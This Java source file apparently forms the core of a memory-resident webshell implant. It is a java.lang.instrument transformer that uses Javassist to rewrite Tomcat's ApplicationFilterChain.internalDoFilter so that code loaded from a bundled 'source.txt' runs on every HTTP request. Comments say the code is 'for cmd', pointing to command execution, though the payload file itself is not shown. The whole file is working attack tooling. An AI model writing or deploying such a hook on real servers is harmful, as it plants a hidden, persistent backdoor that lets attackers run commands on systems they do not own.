package agent;

import javassist.*;
import java.io.*;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className.equals("org/apache/catalina/core/ApplicationFilterChain")) { // class from in jvm named as xxx/xxx/xxx/xxx
            try {
//                System.out.println("a request com and hook the ApplicationFilterChain");
                ClassPool classPool = ClassPool.getDefault();
//                System.out.println("classBeingRedefinefined is :"+classBeingRedefined.getName());// classBeingRedefined = null
                ClassClassPath classPath = new ClassClassPath(className.getClass());  //get className class's classpath
//                System.out.println("this class path :"+classPath.toString())    ;
                classPool.insertClassPath(classPath);  //add the classpath to classpool  To nextfind
//                System.out.println("classPool has :"+classPool.toString());
                if (classBeingRedefined != null) //for avoide case of null, throw exception
                {
                    ClassClassPath classPath1 = new ClassClassPath(classBeingRedefined);
                    classPool.insertClassPath(classPath1);
                }
                CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");  //for xx.xx.xx
                CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");//filterchain dofilter actually implementation ,change it'code and for all request

//                ctMethod.addLocalVariable("elapsedTime", CtClass.longType);
//                ctMethod.insertBefore("{System.out.println(\"执行internalDoFilter\");}");
                ctMethod.insertBefore(readSource());//insert the code for cmd

                byte[] classbytes = ctClass.toBytecode();//get changed code and return ,Notice  after the  method of  toBytecode,the ctClass will be forzen
                /*
                try get fileclass
                 */
//                bytestoclass(classbytes, ".\\tmp\\retransformed.class");//get changed class for check
                System.out.println("*hook完成*");
                ctClass.detach();
                return classbytes;

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    private String readSource() {
        StringBuilder source=new StringBuilder();
        InputStream is = MyTransformer.class.getClassLoader().getResourceAsStream("source.txt");
        InputStreamReader isr = new InputStreamReader(is);
        String line=null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while((line=br.readLine()) != null) {
//                System.out.println("line:"+line);
                source.append(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
//        System.out.println(source);
        return source.toString();
    }

//    private void bytestoclass(byte [] bytes,String filename) {
//        try{
//            File file = new File(".\\tmp");
//            if (!file.exists())
//                file.mkdir();
//            FileOutputStream fos = new FileOutputStream(filename);
//            fos.write(bytes);
//            fos.flush();
//            fos.close();
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//    }
}